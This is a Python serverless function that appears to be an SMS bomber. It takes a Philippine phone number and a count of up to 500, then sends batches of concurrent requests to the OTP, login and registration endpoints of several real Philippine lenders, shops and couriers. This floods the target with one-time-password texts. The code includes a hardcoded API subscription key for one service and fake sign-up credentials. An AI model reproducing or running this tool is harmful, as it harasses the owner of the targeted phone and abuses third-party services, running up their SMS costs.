import json
import asyncio
import aiohttp
import random

SERVICES = [
    "EZLOAN","XPRESS","ABENSON","EXCELLENT_LENDING",
    "FORTUNE_PAY","WEMOVE","LBC","PICKUP_COFFEE",
    "HONEY_LOAN","KOMO_PH","S5_OTP"
]

def normalize(p):
    p = p.replace(" ","").replace("-","")
    if p.startswith("0"): p = "63" + p[1:]
    if len(p) == 10: p = "63" + p
    return "+63" + p[2:] if p.startswith("63") and len(p) == 12 else ""

async def send(svc, session, phone):
    try:
        timeout = aiohttp.ClientTimeout(total=6)
        if svc == "EZLOAN":
            await session.post("https://gateway.ezloancash.ph/security/auth/otp/request",
                json={"businessId":"EZLOAN","contactNumber":phone[1:]}, timeout=timeout)
        elif svc == "XPRESS":
            await session.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                json={"Phone":phone,"Email":f"user{random.randint(10000,99999)}@test.com","Password":"Test123"}, timeout=timeout)
        elif svc == "ABENSON":
            await session.post("https://api.mobile.abenson.com/api/public/membership/activate_otp",
                data={"contact_no":phone[1:]}, timeout=timeout)
        elif svc == "PICKUP_COFFEE":
            await session.post("https://production.api.pickup-coffee.net/v2/customers/login",
                json={"mobile_number":phone}, timeout=timeout)
        elif svc == "HONEY_LOAN":
            await session.post("https://api.honeyloan.ph/api/client/registration/step-one",
                json={"phone":phone[1:]}, timeout=timeout)
        elif svc == "KOMO_PH":
            await session.post("https://api.komo.ph/api/otp/v5/generate",
                json={"mobile":phone[1:]}, headers={"Ocp-Apim-Subscription-Key":"cfde6d29634f44d3b81053ffc6298cba"}, timeout=timeout)
        return True
    except:
        return False

async def attack(phone, count):
    count = min(max(1, count), 500)
    success = failed = 0
    async with aiohttp.ClientSession() as s:
        while success + failed < count:
            remaining = count - success - failed
            batch = min(remaining, 70)
            tasks = [send(random.choice(SERVICES), s, phone) for _ in range(batch)]
            results = await asyncio.gather(*tasks)
            success += sum(results)
            failed += len(results) - sum(results)
    return {"success": success, "failed": failed, "total": count}

def handler(event, context=None):
    try:
        body = event.get("body") or "{}"
        data = json.loads(body) if isinstance(body, str) else body
        target = str(data.get("target", "")).strip()
        sms = int(data.get("sms", 100))

        phone = normalize(target)
        if not phone or len(target) != 11 or not target.startswith("09"):
            return {"statusCode": 400, "body": json.dumps({"error": "Invalid number"})}

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(attack(phone, sms))
        loop.close()

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps(result)
        }
    except:
        return {
            "statusCode": 500,
            "body": json.dumps({"error": "Try again later"})
                     }
